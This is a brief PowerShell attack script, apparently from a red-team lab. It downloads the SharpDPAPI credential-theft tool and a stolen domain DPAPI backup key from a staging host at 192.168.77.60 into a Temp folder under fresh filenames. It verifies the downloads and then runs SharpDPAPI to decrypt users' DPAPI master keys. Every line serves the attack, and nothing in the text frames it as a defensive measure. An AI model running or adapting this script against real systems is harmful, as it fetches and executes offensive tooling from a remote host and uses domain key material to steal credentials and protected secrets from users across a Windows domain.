# Retry: debug mbr01->provisioning download + fresh filenames
$tools = 'C:\Windows\Temp\cadre-tools'
Write-Output '--- connectivity test ---'
$code = & curl.exe -s -m 10 -o NUL -w '%{http_code}' http://192.168.77.60:8081/SharpDPAPI.exe 2>&1
Write-Output "HTTPCODE=$code"
$exit = $LASTEXITCODE
Write-Output "CURL_EXIT=$exit"

Write-Output '--- fresh download (new names) ---'
& curl.exe -s -m 30 -o "$tools\sdp-crte.exe" http://192.168.77.60:8081/SharpDPAPI.exe 2>&1
Write-Output "SDP_EXIT=$LASTEXITCODE"
& curl.exe -s -m 30 -o "$tools\ntds-crte.pvk" http://192.168.77.60:8081/ntds_capi_0_73eeb965-bf4b-4e9a-8e3e-1814df83d602.keyx.rsa.pvk 2>&1
Write-Output "PVK_EXIT=$LASTEXITCODE"

Write-Output '--- verify ---'
if (Test-Path "$tools\sdp-crte.exe") { Write-Output "SDP_SIZE $((Get-Item "$tools\sdp-crte.exe").Length)" } else { Write-Output 'SDP_MISSING' }
if (Test-Path "$tools\ntds-crte.pvk") { Write-Output "PVK_SIZE $((Get-Item "$tools\ntds-crte.pvk").Length)" } else { Write-Output 'PVK_MISSING' }

Write-Output '--- masterkeys /pvk (fresh) ---'
& "$tools\sdp-crte.exe" masterkeys /pvk:"$tools\ntds-crte.pvk" 2>&1 | ForEach-Object { Write-Output "MK|$_" }
Write-Output 'MBR01_35G_V2_DONE'
